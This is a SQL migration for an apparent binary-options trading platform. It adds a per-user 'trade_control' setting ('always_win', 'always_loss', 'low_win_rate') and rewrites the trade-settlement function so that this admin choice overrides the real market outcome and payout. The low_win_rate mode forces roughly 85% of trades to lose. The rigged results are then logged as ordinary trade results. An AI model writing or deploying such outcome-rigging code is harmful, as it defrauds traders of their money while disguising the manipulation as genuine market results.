-- ==========================================================
-- SUPER MIGRATION: TRADE CONTROL & WALLET AUDIT (DATABASE LEVEL)
-- ==========================================================

-- 1. Add trade_control column to profiles
ALTER TABLE public.profiles 
ADD COLUMN IF NOT EXISTS trade_control text DEFAULT 'normal';

-- 2. Add description column to transactions
ALTER TABLE public.transactions
ADD COLUMN IF NOT EXISTS description text;

-- 3. Add constraint for valid values in profiles
DO $$
BEGIN
    IF NOT EXISTS (SELECT 1 FROM pg_constraint WHERE conname = 'profiles_trade_control_check') THEN
        ALTER TABLE public.profiles 
        ADD CONSTRAINT profiles_trade_control_check 
        CHECK (trade_control IN ('normal', 'always_win', 'always_loss', 'low_win_rate'));
    END IF;
END
$$;

-- 4. Update the resolve_binary_trade RPC to enforce control logic and support descriptions
-- This ensures that even if the Edge Function is NOT deployed, 
-- the database will still override the result based on admin settings.
CREATE OR REPLACE FUNCTION public.resolve_binary_trade(
  p_trade_id uuid,
  p_new_status text,
  p_result_price decimal,
  p_payout_amount decimal
) RETURNS jsonb AS $$
DECLARE
  v_user_id uuid;
  v_current_status text;
  v_asset_symbol text;
  v_amount decimal;
  v_binary_type text;
  v_payout_percent integer;
  v_trade_control text;
  v_final_status text;
  v_final_payout decimal;
BEGIN
  -- A. Fetch trade information
  SELECT user_id, status, asset_symbol, amount, type, payout_percent 
  INTO v_user_id, v_current_status, v_asset_symbol, v_amount, v_binary_type, v_payout_percent 
  FROM binary_trades WHERE id = p_trade_id FOR UPDATE;
  
  IF v_current_status != 'pending' THEN
    RETURN jsonb_build_object('success', false, 'message', 'Trade already resolved');
  END IF;

  -- B. Fetch user control setting
  SELECT trade_control INTO v_trade_control FROM profiles WHERE id = v_user_id;
  v_trade_control := COALESCE(v_trade_control, 'normal');

  -- C. Determine final result (Override incoming values based on trade_control)
  v_final_status := p_new_status;
  v_final_payout := p_payout_amount;

  IF v_trade_control = 'always_win' THEN
    v_final_status := 'won';
    v_final_payout := v_amount + (v_amount * v_payout_percent / 100);
  ELSIF v_trade_control = 'always_loss' THEN
    v_final_status := 'lost';
    v_final_payout := 0;
  ELSIF v_trade_control = 'low_win_rate' THEN
    -- Low win rate (approx 15% chance of winning)
    IF random() > 0.15 THEN
      v_final_status := 'lost';
      v_final_payout := 0;
    ELSE
      v_final_status := 'won';
      v_final_payout := v_amount + (v_amount * v_payout_percent / 100);
    END IF;
  END IF;

  -- D. Execute the settlement updates
  UPDATE binary_trades 
  SET status = v_final_status, result_price = p_result_price, settled_at = now()
  WHERE id = p_trade_id;

  IF v_final_payout > 0 THEN
    UPDATE profiles SET balance = balance + v_final_payout WHERE id = v_user_id;
  END IF;

  -- E. Log the transaction (Including trade metadata as description)
  INSERT INTO transactions (
    user_id, type, asset_symbol, amount, price, total, status, binary_type, binary_result, binary_trade_id, description
  )
  VALUES (
    v_user_id, 
    CASE WHEN v_final_status = 'won' THEN 'win' ELSE 'loss' END, 
    v_asset_symbol, 
    v_amount, 
    p_result_price, 
    v_final_payout, 
    'success', 
    v_binary_type, 
    v_final_status, 
    p_trade_id,
    'Trade Result: ' || v_asset_symbol || ' (' || v_binary_type || ')'
  );

  RETURN jsonb_build_object(
    'success', true, 
    'message', 'Trade resolved successfully', 
    'strategy', v_trade_control,
    'result', v_final_status
  );
END;
$$ LANGUAGE plpgsql;
